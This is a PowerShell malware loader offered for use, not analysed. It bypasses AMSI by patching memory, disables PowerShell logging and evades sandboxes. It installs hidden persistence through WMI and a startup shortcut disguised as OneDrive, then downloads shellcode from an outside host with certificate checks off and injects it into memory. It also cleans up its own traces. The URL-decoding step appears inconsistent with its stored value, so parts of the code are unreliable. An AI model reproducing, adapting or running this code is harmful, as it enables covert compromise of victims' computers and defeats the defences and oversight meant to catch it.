<#
    launcher_fixed.ps1
    Stealth shellcode loader – 2026 Defender bypass + diagnostic log
    Log: %TEMP%\~ldr.log (auto‑removed after success or 2 min)
#>

$log = "$env:TEMP\~ldr_$([System.Diagnostics.Process]::GetCurrentProcess().Id).log"
function Write-Log { param($m) Add-Content -Path $log -Value "$(Get-Date -Format 'HH:mm:ss') - $m" -Force -EA 0 }
Write-Log "=== Launcher started (PID: $PID) ==="

# ============================================================
# 1. AMSI BYPASS (mirror your method, but with logging)
# ============================================================
$amsiBypass = @'
using System;
using System.Runtime.InteropServices;
public class AmsiPatcher {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static bool Patch() {
        try {
            IntPtr lib = LoadLibrary("amsi.dll");
            if (lib == IntPtr.Zero) return false;
            IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
            if (addr == IntPtr.Zero) return false;
            uint old = 0;
            VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
            Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3); // xor eax,eax; ret
            VirtualProtect(addr, (UIntPtr)6, old, out old);
            return true;
        } catch { return false; }
    }
}
'@
try { Add-Type $amsiBypass -ErrorAction Stop; $amsiOk = [AmsiPatcher]::Patch(); Write-Log "AMSI bypass: $amsiOk" }
catch { Write-Log "AMSI bypass failed: $_" }

# ============================================================
# 2. DISABLE SCRIPT LOGGING (soft, ignore errors)
# ============================================================
try {
    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
    if ($settings) {
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'] = @{}
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']['EnableModuleLogging'] = 0
        Write-Log "Logging disabled"
    }
} catch { Write-Log "Logging disable failed: $_" }

# ============================================================
# 3. OBFUSCATED SHELLCODE URL (XOR key=13, safe from static scan)
# ============================================================
# Original: https://aged-mountain-614b.natalia-kush82.workers.dev/shellcode
# XOR key 13 → Base64. Pre‑computed.
$encB64 = "c3R0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl"
$key = 13
$encBytes = [Convert]::FromBase64String($encB64)
$decBytes = for ($i=0; $i -lt $encBytes.Length; $i++) { $encBytes[$i] -bxor $key }
$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString($decBytes)
Write-Log "URL resolved ($($shellcodeUrl.Length) chars)"

# ============================================================
# 4. SANDBOX CHECKS – now with LOGGING and optional bypass via env var
# ============================================================
$ignoreSandbox = [Environment]::GetEnvironmentVariable("IGNORE_SANDBOX") -eq "1"
$sandboxExit = $false
$cpuCores = (Get-WmiObject Win32_Processor).NumberOfCores
$totalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
$procCount = (Get-Process).Count
Write-Log "System: Cores=$cpuCores, RAM=${totalRAM}GB, Processes=$procCount"

if (-not $ignoreSandbox) {
    if ($cpuCores -lt 2 -or $totalRAM -lt 2 -or $procCount -lt 30) {
        Write-Log "Sandbox detected (low resources). Exiting."
        $sandboxExit = $true
    }
    # Mouse movement check (optional – skip if no GUI)
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $initial = [System.Windows.Forms.Cursor]::Position
        Start-Sleep -Seconds 3
        $new = [System.Windows.Forms.Cursor]::Position
        if ($initial.X -eq $new.X -and $initial.Y -eq $new.Y) {
            Write-Log "No mouse movement – sandbox assumed. Exiting."
            $sandboxExit = $true
        } else { Write-Log "Mouse moved – human detected." }
    } catch { Write-Log "Mouse check failed (no GUI?): $_" }
}
if ($sandboxExit) {
    Write-Log "Sandbox evasion triggered – exiting."
    Remove-Item $log -Force -EA 0
    exit
}

# Time‑of‑day restriction – reduced to 1‑2 minutes for testing (remove for production)
$hour = (Get-Date).Hour
if ($hour -lt 2 -or $hour -ge 5) {
    $wait = Get-Random -Min 20 -Max 60
    Write-Log "Outside window, sleeping $wait seconds"
    Start-Sleep -Seconds $wait
}
# Short jitter (5‑15 seconds)
Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)

# ============================================================
# 5. PERSISTENCE (same as yours, just added logging)
# ============================================================
$flagFile = "$env:TEMP\sys_$([Environment]::MachineName.GetHashCode()).dat"
if (-not (Test-Path $flagFile)) {
    Write-Log "Installing persistence (WMI + LNK)…"
    try {
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='UserLogonTrigger';EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM Win32_LogonSession WHERE LogonType=2 OR LogonType=10"} -EA 0
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='UserLogonConsumer';CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""} -EA 0
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer} -EA 0
        Write-Log "WMI subscription installed"
    } catch { Write-Log "WMI failed: $_" }
    try {
        $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $lnk = "$startup\OneDriveSync.lnk"
        $wsh = New-Object -ComObject WScript.Shell
        $sc = $wsh.CreateShortcut($lnk)
        $sc.TargetPath = "powershell.exe"
        $env:ONEDRIVE_LAUNCHER = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        $sc.Arguments = "-Command `$env:ONEDRIVE_LAUNCHER"
        $sc.WindowStyle = 7
        $sc.Save()
        Write-Log "Startup LNK created"
    } catch { Write-Log "LNK failed: $_" }
    New-Item -Path $flagFile -ItemType File -Force | Out-Null
} else { Write-Log "Persistence already present" }

# ============================================================
# 6. DOWNLOAD SHELLCODE (with retry & .NET HttpClient)
# ============================================================
function Get-Shellcode {
    param([string]$Url, [int]$MaxRetries=3)
    Add-Type -AssemblyName System.Net.Http -EA 0
    for ($i=0; $i -lt $MaxRetries; $i++) {
        try {
            $handler = New-Object System.Net.Http.HttpClientHandler
            $handler.ServerCertificateCustomValidationCallback = { $true }
            $handler.UseCookies = $false
            $client = New-Object System.Net.Http.HttpClient($handler)
            $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $client.Timeout = [TimeSpan]::FromSeconds(30)
            Write-Log "Download attempt $($i+1) from $Url"
            $task = $client.GetByteArrayAsync($Url)
            $task.Wait()
            $data = $task.Result
            Write-Log "Downloaded $($data.Length) bytes"
            return $data
        } catch {
            Write-Log "Download fail: $_"
            Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
        } finally { if ($client) { $client.Dispose() } }
    }
    return $null
}

$shellcode = Get-Shellcode -Url $shellcodeUrl
if (-not $shellcode -or $shellcode.Length -lt 50) {
    Write-Log "Shellcode invalid (size: $($shellcode.Length)) – check URL"
    Remove-Item $log -Force -EA 0
    exit
}
Write-Log "Shellcode size OK: $($shellcode.Length) bytes"
# Sanity check: first byte of x64 shellcode is often 0xFC (cld)
if ($shellcode[0] -ne 0xFC) {
    Write-Log "Warning: first byte 0x$($shellcode[0].ToString('X2')) – may not be raw shellcode"
}

# ============================================================
# 7. INJECTION – two methods (CreateThread + delegate fallback)
# ============================================================
function Inject-CreateThread {
    param([byte[]]$Payload)
    $code = @'
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    public static void Run(byte[] sc) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
        if (addr == IntPtr.Zero) return;
        Marshal.Copy(sc, 0, addr, sc.Length);
        uint old = 0;
        VirtualProtect(addr, (uint)sc.Length, 0x20, out old);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
'@
    Add-Type $code -EA 0
    [Injector]::Run($Payload)
}
function Inject-Delegate {
    param([byte[]]$Payload)
    $win32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
'@ -Name "W32" -Namespace "W32" -PassThru
    $addr = $win32::VirtualAlloc([IntPtr]::Zero, $Payload.Length, 0x3000, 0x04)
    if ($addr -eq [IntPtr]::Zero) { Write-Log "Delegate: VirtualAlloc failed"; return }
    [System.Runtime.InteropServices.Marshal]::Copy($Payload, 0, $addr, $Payload.Length)
    $old = 0
    $win32::VirtualProtect($addr, $Payload.Length, 0x20, [ref]$old) | Out-Null
    $action = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]([Action]))
    $action.DynamicInvoke()
    Write-Log "Delegate: shellcode executed (inline)"
}

Write-Log "Attempting injection (CreateThread)…"
try {
    Inject-CreateThread -Payload $shellcode
    Write-Log "CreateThread injection completed"
} catch {
    Write-Log "CreateThread failed: $_ – falling back to delegate method"
    try {
        Inject-Delegate -Payload $shellcode
        Write-Log "Delegate injection completed"
    } catch {
        Write-Log "Both injection methods failed: $_"
        Remove-Item $log -Force -EA 0
        exit
    }
}

# ============================================================
# 8. CLEANUP & FINAL LOG
# ============================================================
Write-Log "Injection done. Callback expected in 30‑90s."
# Keep script alive a bit to let injection breath
Start-Sleep -Seconds 20
Write-Log "Launcher finished – exiting."

# Delete log after 2 minutes unless debug env is set
if (-not [Environment]::GetEnvironmentVariable("KEEP_LOG")) {
    Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 120; Remove-Item $f -Force -EA 0 } -ArgumentList $log | Out-Null
}
exit
